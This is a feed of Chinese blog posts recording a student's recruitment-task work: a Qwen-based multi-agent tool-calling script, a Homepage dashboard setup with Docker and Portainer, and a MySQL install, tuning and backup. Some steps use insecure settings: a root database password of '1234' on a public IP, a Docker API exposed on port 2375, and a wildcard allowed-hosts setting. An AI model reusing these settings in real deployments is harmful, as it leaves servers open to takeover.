存储解析后的知识库条目（标题+文本） self.embeddings = [] # 存储文本的嵌入向量（计算机可理解的“数字表示”） self.load_and_process() # 启动加载与处理流程 # 还需要手动处理 entry、text 等内容 def load_and_process(self): # 检查文件是否存在，不存在则创建示例知识库 if not os.path.exists(self.kb_path): self.create_sample_kb() # 读取文件内容 with open(self.kb_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() # 按Markdown标题分割条目（核心解析逻辑） entries = re.split(r\u0026#39;\\n# \u0026#39;, content) # 用“换行+# ”分割内容（Markdown一级标题格式） if entries and entries[0].strip() == \u0026#39;\u0026#39;: # 处理开头可能的空字符串 entries = entries[1:] # 提取每个条目的标题和文本，存入self.entries for entry in entries: lines = entry.split(\u0026#39;\\n\u0026#39;, 1) # 按第一个换行分割（标题和正文分离） title = lines[0].strip() # 标题（如“DevOps”） text = lines[1].strip() if len(lines) \u0026gt; 1 else \u0026#34;\u0026#34; # 正文内容 self.entries.append({\u0026#34;title\u0026#34;: title, \u0026#34;text\u0026#34;: text}) # 生成嵌入 if self.entries: # 将每个条目的“标题+文本”拼接成完整字符串 texts = [f\u0026#34;{e[\u0026#39;title\u0026#39;]}: {e[\u0026#39;text\u0026#39;]}\u0026#34; for e in self.entries] # 用模型将文本转化为向量（嵌入），存储到 self.embeddings self.embeddings = self.model.encode(texts, convert_to_tensor=True) 完整示例代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 import os import json import requests import re from openai import OpenAI from sentence_transformers import SentenceTransformer import torch # 初始化 OpenAI 客户端 client = OpenAI( api_key=\u0026#34;......\u0026#34;, base_url=\u0026#34;https://dashscope.aliyuncs.com/compatible-mode/v1\u0026#34;, ) # 工具定义 WEATHER_API_KEY = \u0026#34;......\u0026#34; def get_weather(city: str) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;查询指定城市的实时天气\u0026#34;\u0026#34;\u0026#34; url = f\u0026#34;http://apis.juhe.cn/simpleWeather/query?city={city}\u0026amp;key={WEATHER_API_KEY}\u0026#34; try: response = requests.get(url, timeout=10) response.raise_for_status() data = response.json() except requests.exceptions.RequestException as e: return f\u0026#34;天气查询请求失败：{str(e)}\u0026#34; except json.JSONDecodeError: return \u0026#34;天气查询结果解析失败：返回内容不是有效的JSON\u0026#34; if data.get(\u0026#34;reason\u0026#34;) == \u0026#34;查询成功!\u0026#34;: result = data[\u0026#34;result\u0026#34;] return (f\u0026#34;{city}当前天气：{result[\u0026#39;realtime\u0026#39;][\u0026#39;info\u0026#39;]}，\u0026#34; f\u0026#34;温度：{result[\u0026#39;realtime\u0026#39;][\u0026#39;temperature\u0026#39;]}℃，\u0026#34; f\u0026#34;湿度：{result[\u0026#39;realtime\u0026#39;][\u0026#39;humidity\u0026#39;]}%\u0026#34;) return f\u0026#34;查询天气失败：{data.get(\u0026#39;reason\u0026#39;, \u0026#39;未知错误\u0026#39;)}\u0026#34; def web_search(query: str) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;使用DuckDuckGo进行网络搜索\u0026#34;\u0026#34;\u0026#34; url = \u0026#34;https://api.duckduckgo.com/\u0026#34; params = { \u0026#34;q\u0026#34;: query, \u0026#34;format\u0026#34;: \u0026#34;json\u0026#34;, \u0026#34;no_html\u0026#34;: 1, \u0026#34;no_redirect\u0026#34;: 1 } try: response = requests.get(url, params=params, timeout=10) response.raise_for_status() except requests.exceptions.RequestException as e: return f\u0026#34;搜索请求失败：{str(e)}\u0026#34; try: data = response.json() except json.JSONDecodeError: return \u0026#34;搜索结果解析失败：返回内容不是有效的JSON\u0026#34; summary = [] if data.get(\u0026#34;Abstract\u0026#34;): summary.append(f\u0026#34;摘要：{data[\u0026#39;Abstract\u0026#39;]}\u0026#34;) for topic in data.get(\u0026#34;RelatedTopics\u0026#34;, [])[:2]: if \u0026#34;Text\u0026#34; in topic: summary.append(f\u0026#34;- {topic[\u0026#39;Text\u0026#39;]}\u0026#34;) return \u0026#34;\\n\u0026#34;.join(summary) if summary else \u0026#34;未找到相关搜索结果\u0026#34; class KnowledgeBase: \u0026#34;\u0026#34;\u0026#34;简单的知识库系统，支持语义搜索\u0026#34;\u0026#34;\u0026#34; def __init__(self, kb_path=\u0026#34;knowledge_base.md\u0026#34;): self.kb_path = kb_path self.model = SentenceTransformer(\u0026#39;paraphrase-multilingual-MiniLM-L12-v2\u0026#39;) self.entries = [] self.embeddings = None # 初始化为None self.load_and_process() def load_and_process(self): \u0026#34;\u0026#34;\u0026#34;加载知识库文件并生成嵌入向量\u0026#34;\u0026#34;\u0026#34; if not os.path.exists(self.kb_path): # 创建示例知识库 self.create_sample_kb() with open(self.kb_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() # 按Markdown标题分割条目 entries = re.split(r\u0026#39;\\n# \u0026#39;, content) if entries and entries[0].strip() == \u0026#39;\u0026#39;: entries = entries[1:] self.entries = [] for entry in entries: lines = entry.split(\u0026#39;\\n\u0026#39;, 1) title = lines[0].strip() text = lines[1].strip() if len(lines) \u0026gt; 1 else \u0026#34;\u0026#34; self.entries.append({\u0026#34;title\u0026#34;: title, \u0026#34;text\u0026#34;: text}) # 生成嵌入 if self.entries: texts = [f\u0026#34;{e[\u0026#39;title\u0026#39;]}: {e[\u0026#39;text\u0026#39;]}\u0026#34; for e in self.entries] self.embeddings = self.model.encode(texts, convert_to_tensor=True) else: self.embeddings = None def create_sample_kb(self): \u0026#34;\u0026#34;\u0026#34;创建示例知识库，不存在时调用\u0026#34;\u0026#34;\u0026#34; sample_kb = \u0026#34;\u0026#34;\u0026#34;# DevOps DevOps 是什么呢？ \u0026#34;\u0026#34;\u0026#34; with open(self.kb_path, \u0026#39;w\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: f.write(sample_kb) print(f\u0026#34;已创建示例知识库文件: {self.kb_path}\u0026#34;) def search(self, query, top_k=2): \u0026#34;\u0026#34;\u0026#34;搜索知识库，返回最相关的条目\u0026#34;\u0026#34;\u0026#34; if not self.entries or self.embeddings is None: return [{\u0026#34;title\u0026#34;: \u0026#34;知识库为空\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;没有可用的知识库条目\u0026#34;, \u0026#34;score\u0026#34;: 0.0}] query_embedding = self.model.encode([query], convert_to_tensor=True) # 计算余弦相似度 cos_scores = torch.nn.functional.cosine_similarity( query_embedding, self.embeddings ) # 获取top_k结果 top_results = torch.topk(cos_scores, k=min(top_k, len(cos_scores))) results = [] for idx, score in zip(top_results.indices, top_results.values): if score \u0026gt; 0.3: # 设置相似度阈值 results.append({ \u0026#34;title\u0026#34;: self.entries[idx][\u0026#34;title\u0026#34;], \u0026#34;text\u0026#34;: self.entries[idx][\u0026#34;text\u0026#34;], \u0026#34;score\u0026#34;: float(score) }) return results # 初始化知识库 kb = KnowledgeBase() def query_knowledge_base(query: str) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;查询知识库并返回格式化结果\u0026#34;\u0026#34;\u0026#34; results = kb.search(query) if not results or (len(results) == 1 and results[0][\u0026#34;title\u0026#34;] == \u0026#34;知识库为空\u0026#34;): return \u0026#34;在知识库中未找到相关信息\u0026#34; response = \u0026#34;【知识库检索结果】\\n\u0026#34; for i, res in enumerate(results, 1): response += f\u0026#34;\\n{i}. {res[\u0026#39;title\u0026#39;]}\\n{res[\u0026#39;text\u0026#39;]}\\n相似度: {res[\u0026#39;score\u0026#39;]:.2f}\\n\u0026#34; return response # 角色定义 AGENT_A_PROMPT = \u0026#34;\u0026#34;\u0026#34;你是 Agent A，任务规划者。职责： 1. 分析用户请求，拆解为需要执行的子任务（每个子任务对应一个工具调用） 2. 为每个子任务指定需要调用的工具（get_weather、web_search 或 query_knowledge_base）和参数 3. 等待所有子任务执行完成后，整合结果并以自然语言回复用户 重要规则： - 当用户询问特定领域知识（如技术概念、公司内部信息等）时，优先使用 query_knowledge_base 工具 - 当需要实时信息（如天气、新闻）时，使用 get_weather 或 web_search - 不要自己编造知识库中没有的信息 - 工具调用结果会通过 tool_response 反馈给你\u0026#34;\u0026#34;\u0026#34; AGENT_B_PROMPT = \u0026#34;\u0026#34;\u0026#34;你是 Agent B，任务执行者。职责： 1. 接收 Agent A 的子任务指令 2. 严格按指令调用指定工具（get_weather、web_search 或 query_knowledge_base） 3. 仅返回工具调用的原始结果，不要添加任何解释或格式化 重要规则： - 你不需要生成 tool_call - 直接返回工具函数的执行结果字符串 - 结果必须是纯文本，不要包含JSON或其他结构\u0026#34;\u0026#34;\u0026#34; # 初始化Agent A的对话记忆 messages_a = [{\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: AGENT_A_PROMPT}] # 工具列表定义（新增知识库查询工具） tools = [ { \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34;, \u0026#34;function\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;get_weather\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;查询城市实时天气\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;properties\u0026#34;: {\u0026#34;city\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;}}, \u0026#34;required\u0026#34;: [\u0026#34;city\u0026#34;] } } }, { \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34;, \u0026#34;function\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;web_search\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;网络搜索关键词\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;properties\u0026#34;: {\u0026#34;query\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;}}, \u0026#34;required\u0026#34;: [\u0026#34;query\u0026#34;] } } }, { \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34;, \u0026#34;function\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;query_knowledge_base\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;查询内部知识库获取特定领域知识\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;properties\u0026#34;: {\u0026#34;query\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;}}, \u0026#34;required\u0026#34;: [\u0026#34;query\u0026#34;] } } } ] def main(): while True: user_input = input(\u0026#34;\\n你：\u0026#34;) if user_input.lower() in [\u0026#34;exit\u0026#34;, \u0026#34;quit\u0026#34;, \u0026#34;退出\u0026#34;]: print(\u0026#34;AI：拜拜~\u0026#34;) break # 将用户输入加入Agent A的上下文 messages_a.append({\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: user_input}) # Agent A：拆解任务并生成工具调用计划 while True: # 处理多轮工具调用 try: agent_a_response = client.chat.completions.create( model=\u0026#34;qwen-plus\u0026#34;, messages=messages_a, tools=tools, tool_choice=\u0026#34;auto\u0026#34; ) agent_a_msg = agent_a_response.choices[0].message messages_a.append(agent_a_msg) except Exception as e: print(f\u0026#34;API调用错误: {str(e)}\u0026#34;) break # 检查是否需要工具调用 if not hasattr(agent_a_msg, \u0026#39;tool_calls\u0026#39;) or not agent_a_msg.tool_calls: # 无需工具调用，直接输出结果 print(f\u0026#34;AI：{agent_a_msg.content}\u0026#34;) break # 处理所有工具调用 for tool_call in agent_a_msg.tool_calls: func_name = tool_call.function.name try: func_args = json.loads(tool_call.function.arguments) print(f\u0026#34;正在执行: {func_name}({json.dumps(func_args, ensure_ascii=False)})...\u0026#34;) except json.JSONDecodeError: # 工具调用参数解析失败，反馈给Agent A messages_a.append({ \u0026#34;role\u0026#34;: \u0026#34;tool\u0026#34;, \u0026#34;tool_call_id\u0026#34;: tool_call.id, \u0026#34;name\u0026#34;: func_name, \u0026#34;content\u0026#34;: f\u0026#34;工具调用参数解析失败：{tool_call.function.arguments}\u0026#34; }) continue # 执行工具调用 try: if func_name == \u0026#34;get_weather\u0026#34;: result = get_weather(**func_args) elif func_name == \u0026#34;web_search\u0026#34;: result = web_search(**func_args) elif func_name == \u0026#34;query_knowledge_base\u0026#34;: result = query_knowledge_base(**func_args) else: result = f\u0026#34;未知工具：{func_name}\u0026#34; except Exception as e: result = f\u0026#34;执行工具时出错: {str(e)}\u0026#34; # 将结果反馈给 Agent A messages_a.append({ \u0026#34;role\u0026#34;: \u0026#34;tool\u0026#34;, \u0026#34;tool_call_id\u0026#34;: tool_call.id, \u0026#34;name\u0026#34;: func_name, \u0026#34;content\u0026#34;: result }) # 保存最终回复到上下文 if hasattr(agent_a_msg, \u0026#39;content\u0026#39;) and agent_a_msg.content: messages_a.append({\u0026#34;role\u0026#34;: \u0026#34;assistant\u0026#34;, \u0026#34;content\u0026#34;: agent_a_msg.content}) if __name__ == \u0026#34;__main__\u0026#34;: main() 勉强跑通，但是具体的实现不太了解，感觉接口有点复杂了\nknowledge_base.md:\n1 2 # DevOps DevOps是一个大笨蛋 效果：\n知识缺漏比较多，先到这里吧\n","date":"2025-10-21T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-agent%E4%B8%93%E9%A2%98/","title":"御林招新题：Agent 专题"},{"content":"任务：安装并配置一个基础的 Homepage\n什么是 Homepage？ A modern, fully static, fast, secure fully proxied, highly customizable application dashboard with integrations for over 100 services and translations into multiple languages. Easily configured via YAML files or through docker label discovery.\n阅读文档，选择安装方式 访问 Homepage 的官方 GitHub 或官方网站。 在文档中找到“安装指南”部分，根据你已经学过的知识，选择最合适的安装方式（推荐使用 Docker 或 Docker Compose）。 根据文档说明，完成 Homepage 的安装。 理解配置，设置主页标题 在文档中找到“配置”部分，了解其配置文件的结构。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # docker compose 的配置 # 可以用 docker proxy 来反向代理，增加安全性？ # 保存为 docker-compose.yml,然后 docker-compose up -d 启动,后续直接修改 yml,docker-compose restart 即可修改配置 services: homepage: image: ghcr.io/gethomepage/homepage:latest container_name: homepage environment: HOMEPAGE_ALLOWED_HOSTS: 8.137.38.223:3000 # 补上端口 # required, may need port. See gethomepage.dev/installation/#homepage_allowed_hosts PUID: 1000 # optional, your user id PGID: 1000 # optional, your group id ports: - 3000:3000 volumes: - ~/docker/homepage/config:/app/config # Make sure your local config directory exists # - /var/run/docker.sock:/var/run/docker.sock:ro # optional, for docker integrations # 用到 docker 集成的时候需要 restart: unless-stopped mkdir -p ~/docker/homepage/config\n启动容器后自动挂载\n安装 docker-compose 加装一下（要用 pip3），又发现要 rust 环境，再加装\u0026ndash; sudo curl -L \u0026quot;https://github.com/docker/compose/releases/download/1.29.1/docker-compose-$(uname -s)-$(uname -m)\u0026quot; -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose 进去了但没完全进去……\n原因是配置文件只写了域名没写端口，改一下\n原因是 HOMEPAGE_ALLOWED_HOSTS 得要配置，先设置为 “*” 禁用了（不安全，可能会被攻击）\nrestart 还没办法重载配置……需要docker-compose down然后docker-compose up -d，就可以进入了 1 2 3 4 # cofig 的配置 my-remote-docker: host: 192.168.0.101 port: 2375 根据文档说明，修改配置文件，将你的主页标题设置为你喜欢的名字（例如：“我的DevOps控制台”）。 参考：Settings - Homepage，修改完可以热加载\n有主题、外观等等\n添加你的第一个服务 在文档中找到“服务（Services）”或“应用程序（Apps）”相关的章节。 参考：Services - Homepage，修改 service.yaml\n根据文档中的示例，在配置文件中添加至少一个服务。这个服务可以是： 你在 Docker 任务中搭建的 searxng。 一个你常用的网站，例如 GitHub、你自己的博客或任何其他网站。 要求：确保你正确配置了服务的名称、图标和URL。 1 2 3 4 5 6 7 8 9 10 11 - Group One: - My Blog: icon: https://raw.githubusercontent.com/calendar0917/images/master/6a4b02385b1bb87d52812566164e8031.jpg href: https://calendar0917.github.io/ description: Welcome To My Blog! - Group Two: - 御林工作室: icon: http://recruit.yulinsec.cn/assets/favicon-CKa7I3RX.webp href: http://recruit.yulinsec.cn/#/game description: 来写几道题吧 验证 重新加载或重启你的 Homepage 服务。 在浏览器中访问你的 Homepage，确认标题已更改，并且你添加的服务图标可以正常点击，并跳转到正确的页面。 见上\n进阶服务与集成 在文档中找到“增强服务（Enhanced services）”或“小部件（Widgets）”部分。 添加一个支持状态检查的服务。例如，你可以添加你的 searxng 服务，并配置 Homepage 能够自动检查其运行状态（在线/离线）。 1 2 3 4 5 6 # service.yaml - Group Three: - Searxng: href: http://8.137.38.223:8081 siteMonitor: http://8.137.38.223:8081 icon: searxng.png 小部件定制 在文档中找到“小部件”章节，根据说明在你的主页上添加至少一个实用的小部件。 先看看有什么 Widgets(小部件) 可以用：Info Widgets - Homepage\n1 2 3 4 - datetime: text_size: xl format: timeStyle: short 添加了一个时间\n尝试添加一个 Docker 状态小部件，使其能显示你的 Docker 容器数量或状态，这需要你在文档中找到如何与 Docker API 集成的方法。 参考：using-socket-directly\n需要用到 docker socket 集成，上面的 docker-compose.yml 注释要去掉了,还要把PGID、PUID删掉，才能以 root 运行（？）\n不知道怎么使用，换方案\n参考：HomePage导航下集 常见组件的设置，这里提到了 portainer 可视化工具，刚好 homepage 有整合\n安装参考：Docker | docker安装portainer详细步骤-CSDN博客\n1 2 3 docker pull portainer/portainer-ce # 启动镜像 docker run -d -p 9000:9000 -p 9443:9443 -v /var/run/docker.sock:/var/run/docker.sock -v /dockerData/portainer:/data --restart=always --name portainer portainer/portainer-ce:latest 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # setting.yaml - Group Three: - Searxng: href: http://8.137.38.223:8081 siteMonitor: http://8.137.38.223:8081 icon: searxng.png - Portainer: icon: portainer.png href: http://8.137.38.223:9000 # Portainer IP:9000 description: Portainer ping: 127.0.0.1 # Portainer IP server: my-docker showStats: true container: portainer widget: type: portainer url: https://8.137.38.223:9443 env: 2 key: ...... 遇到的问题：\n刚开始没有映射 9443 端口（用于认证？）\n重新映射只需要 docker rm \u0026hellip;，这样只会删除容器而不会删除数据卷，然后重新 docker run 即可 感觉暴露了 portainer 有点危险\nportainer 自带登录验证 效果：\n主题与布局自定义 在文档中找到“主题（Themes）”和“布局（Layout）”相关的章节。 Theme\n尝试更改 Homepage 的默认主题，或者通过修改配置文件，调整服务图标的排列顺序或分组方式。 1 2 3 4 5 # setting.yaml layout: Group One: style: row columns: 2 Group One 由单列变为双列：\n挑战：尝试在配置文件中添加自定义 CSS，改变某个元素的颜色或字体。这需要你仔细阅读文档中关于“自定义”的部分。 Custom-css-js，很简短的说明\nTo add custom css simply edit the custom.css file under your config directory, similarly for javascript you would edit custom.js.\n刚开始不知道去哪里找元素，其实直接 F12 看元素所属的类，然后修改就可以了 1 2 3 4 \u0026lt;--! custom.css 字体变为红色 --\u0026gt; .service-group-name{ color: #FF3A00; } 效果：\n","date":"2025-10-20T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251020172907999.png","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-homepage/","title":"御林招新题：Homepage"},{"content":"MySQL 安装与配置 任务：在你的 Linux 系统上安装 MySQL 服务器，并进行基本的安全配置。\n具体操作：\n使用系统包管理器安装 MySQL。 1 2 3 4 5 6 7 8 9 10 11 # 下载 MySQL 5.7 的官方源，yum 默认不包含，不能直接下载 wget https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm # 安装源包，检查是否启用源 sudo rpm -ivh mysql57-community-release-el7-11.noarch.rpm sudo yum repolist enabled | grep \u0026#34;mysql.*-community.*\u0026#34; # 再安装 sudo yum install mysql-community-server -y # 装到这里要确认密钥，有点麻烦，换方案，直接下载 tar 包 sudo systemctl start mysqld # 安全脚本 sudo mysql_secure_installation 参考：Linux 安装Mysql 详细教程（图文教程）_linux mysql安装教程-CSDN博客\n下载 tar 包：MySQL :: Download MySQL Community Server (Archived Versions)，上传\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 tar -zxvf mysql-5.7.35-linux-glibc2.12-x86_64.tar.gz # 创建目录并赋权 groupadd mysql \u0026amp;\u0026amp; useradd -r -g mysql mysql mkdir -p /data/mysql chown mysql:mysql -R /data/mysql chown mysql:mysql -R /usr/local/mysql chown mysql:mysql -R /tmp # 改配置 vim /etc/my.cnf # 见下 # 初始化 cd /usr/local/mysql/bin/ ./mysqld --defaults-file=/etc/my.cnf --basedir=/usr/local/mysql/ --datadir=/data/mysql/ --user=mysql --initialize # 启动 cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysql service mysql start # 改密码操作比较繁琐，不做记录，参考文章 1 2 3 4 5 6 7 8 9 10 11 12 13 [mysqld] bind-address=0.0.0.0 port=3306 user=mysql basedir=/usr/local/mysql datadir=/data/mysql socket=/tmp/mysql.sock log-error=/data/mysql/mysql.err pid-file=/data/mysql/mysql.pid #character config character_set_server=utf8mb4 symbolic-links=0 explicit_defaults_for_timestamp=true 运行 MySQL 的安全脚本，设置 root 密码，并删除不安全的用户和数据库。 验证：使用 mysql -u root -p 命令登录，确认能成功进入 MySQL 命令行。 1 2 3 4 5 6 7 # 添加快速启动 sudo ln -s /usr/local/mysql/bin/mysql /usr/bin/mysql # 注意：这样安装需要添加默认启动路径，如下 # 登录 [root@iZ2vc96n4f90pw7f8dfbfsZ bin]# mysql -u root -p Enter password: Welcome to the MySQL monitor. Commands end with ; or \\g. 1 2 3 4 5 6 7 8 9 10 # /etc/systemd/system/mysql.service,配置service [Unit] Description=MySQL Server After=network.target [Service] User=mysql Group=mysql ExecStart=/path/to/mysql-8.0.27/bin/mysqld --defaults-file=/path/to/mysql-8.0.27/my.cnf ExecStop=/path/to/mysql-8.0.27/bin/mysqladmin --defaults-file=/path/to/mysql-8.0.27/my.cnf shutdown Restart=on-failure [Install] WantedBy=multi-user.target 数据库操作与管理 任务：创建数据库、表，并进行数据的导入与导出。\n具体操作：\n在 MySQL 中创建一个新的数据库和一张表（例如，一个名为 students 的表，包含 id, name, score 等字段）。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # 建库 CREATE DATABASE test_db; USE test_db; # 建表 CREATE TABLE students ( id INT AUTO_INCREMENT PRIMARY KEY, name VARCHAR(50) NOT NULL, score DECIMAL(5,2) ); # 插入数据 INSERT INTO students (name, score) VALUES (\u0026#39;Alice\u0026#39;, 85.5), (\u0026#39;Bob\u0026#39;, 92.0), (\u0026#39;Charlie\u0026#39;, 78.5); # 这里先出去 shell 导出 # mysqldump -u root -p test_db \u0026gt; test_db_backup.sql # 删库 DROP DATABASE test_db; # 重建 CREATE DATABASE test_db; USE test_db; # 导入 mysql -u root -p test_db \u0026lt; test_db_backup.sql 1 mysqldump -u root -p test_db \u0026gt; test_db_backup.sql # 导出 插入几条数据到表中。 导出：使用 mysqldump 命令将你的数据库导出为一个 SQL 文件。 1 2 3 4 5 [root@iZ2vc96n4f90pw7f8dfbfsZ bin]# ./mysqldump -u root -p test_db \u0026gt; test_db_backup.sql Enter password:.... [root@iZ2vc96n4f90pw7f8dfbfsZ bin]# ls | grep test ... test_db_backup.sql # 备份的表 导入：删除你创建的数据库，然后使用导出的 SQL 文件将其恢复。 1 2 3 4 5 6 7 8 9 10 11 12 13 mysql\u0026gt; SHOW DATABASES -\u0026gt; ; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | | test_db | +--------------------+ 5 rows in set (0.00 sec) 数据库性能调优 任务：了解并修改 MySQL 的关键配置参数，以提高性能。\n具体操作：\n找到 MySQL 的配置文件（通常是 /etc/mysql/my.cnf 或 /etc/my.cnf）。\n挑战：\n修改 innodb_buffer_pool_size 参数，并简要解释该参数的作用。 InnoDB 存储引擎极为关键的参数，它指定了 InnoDB 缓冲池的大小。InnoDB 缓冲池主要用于缓存表数据、索引数据等，当数据库进行查询操作时，会先从缓冲池中查找所需数据，如果能找到（即命中缓存），就可以避免从磁盘读取数据，从而极大地提高查询性能。\n修改 max_connections 参数，并解释其对系统资源和并发连接的影响。 用于设置 MySQL 服务器允许的最大并发连接数。过小会导致部分连接被拒绝，过多会占用服务器资源。\n1 2 3 4 5 6 7 [root@iZ2vc96n4f90pw7f8dfbfsZ local]# vi /etc/my.cnf [mysqld] bind-address=0.0.0.0 port=3306 ...... innodb_buffer_pool_size = 2G max_connections = 500 验证：重启 MySQL 服务，并确认新的配置已生效。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 [root@iZ2vc96n4f90pw7f8dfbfsZ support-files]# mysql -u root -p ...... mysql\u0026gt; SHOW VARIABLES LIKE \u0026#39;innodb_buffer_pool_size\u0026#39;; +-------------------------+------------+ | Variable_name | Value | +-------------------------+------------+ | innodb_buffer_pool_size | 2147483648 | +-------------------------+------------+ 1 row in set (0.01 sec) mysql\u0026gt; SHOW VARIABLES LIKE \u0026#39;max_connections\u0026#39;; +-----------------+-------+ | Variable_name | Value | +-----------------+-------+ | max_connections | 500 | +-----------------+-------+ 1 row in set (0.00 sec) 应用程序集成与数据处理 任务：编写一个简单的应用程序，连接到你的 MySQL 数据库，执行查询和计算，并将结果导出。\n具体操作：\n语言选择：你可以使用任何你熟悉的语言（推荐使用Python）。 程序功能： 连接到你在必做部分创建的数据库。 查询 students 表中的所有数据。 计算学生的平均分数。 将所有数据（包括计算出的平均分）写入一个名为 report.csv 的 CSV 文件中。 要求：在代码中添加注释，解释连接数据库、执行查询和写入文件的关键步骤。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 # 代码模板 import pymysql import csv # 数据库连接配置 db_config = { \u0026#34;host\u0026#34;: \u0026#34;8.137.38.223\u0026#34;, # MySQL 主机地址 \u0026#34;user\u0026#34;: \u0026#34;root\u0026#34;, # 数据库用户名 \u0026#34;password\u0026#34;: \u0026#34;1234\u0026#34;, # 数据库密码 \u0026#34;database\u0026#34;: \u0026#34;test_db\u0026#34; # 数据库名 } # 连接数据库 conn = pymysql.connect(**db_config) cursor = conn.cursor() # 查询 students 表中的所有数据 query_sql = \u0026#34;SELECT * FROM students\u0026#34; cursor.execute(query_sql) students_data = cursor.fetchall() # 获取表的列名 column_names = [desc[0] for desc in cursor.description] # 计算学生的平均分数 scores = [row[2] for row in students_data] # 假设分数在第三列（索引为2） average_score = sum(scores) / len(scores) if scores else 0 # 将所有数据写入 report.csv 文件 with open(\u0026#34;report.csv\u0026#34;, \u0026#34;w\u0026#34;, newline=\u0026#34;\u0026#34;) as csvfile: writer = csv.writer(csvfile) # 写入列名 writer.writerow(column_names + [\u0026#34;average_score\u0026#34;]) # 写入每行数据以及平均分 for row in students_data: writer.writerow(list(row) + [average_score]) # 关闭游标和连接 cursor.close() conn.close() print(\u0026#34;数据查询、计算及导出完成，结果已保存至 report.csv 文件\u0026#34;) pymysql 库的使用：\nconn = pymysql.connect() 建立连接，传入 host port user password database，连接成功，返回一个 conn 对象，用这个对象操作\ncursor = conn.cursor() 创建游标对象，用于执行 sql 语句\n还有conn.cursor(pymysql.cursors.DictCursor)，返回一个字典游标，用于插入字典 cursor.execute(\u0026quot;...\u0026quot;)，执行\n防注入写法：\n1 2 3 data = (\u0026#34;Alice\u0026#34;, 85.5) sql = \u0026#34;INSERT INTO students (name, score) VALUES (%s, %s)\u0026#34; cursor.execute(sql, data) 获取数据：fetchall() fetchone() fetchmany(size)\n释放资源：cursor.close() conn.close()\n自动化备份与恢复 任务：编写一个 Shell 脚本，自动化数据库的日常备份。 具体操作： 编写一个 Shell 脚本，使用 mysqldump 命令备份你的数据库。 脚本应为备份文件自动添加时间戳，例如 backup_db_2025-09-15.sql。 使用 crontab 将该脚本设置为每天凌晨自动运行一次。 验证：手动执行脚本，并检查是否成功生成了带有时间戳的备份文件。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #!/bin/bash DB_USER=\u0026#34;root\u0026#34; # 用户名 DB_PASSWORD=\u0026#34;....\u0026#34; # MySQL 密码 DB_NAME=\u0026#34;test_db\u0026#34; # 要备份的数据库名 BACKUP_DIR=\u0026#34;/usr/local/mysql/backup\u0026#34; # 备份文件保存目录 DATE=$(date +\u0026#34;%Y-%m-%d\u0026#34;) # 命令行中，date +%Y-%m-%d 可以格式化 date 输出 BACKUP_FILE=\u0026#34;$BACKUP_DIR/backup_${DB_NAME}_${DATE}.sql\u0026#34; # 备份文件名 # 使用 mysqldump 备份数据库 # 这里得要指定路径，系统变量没配置好 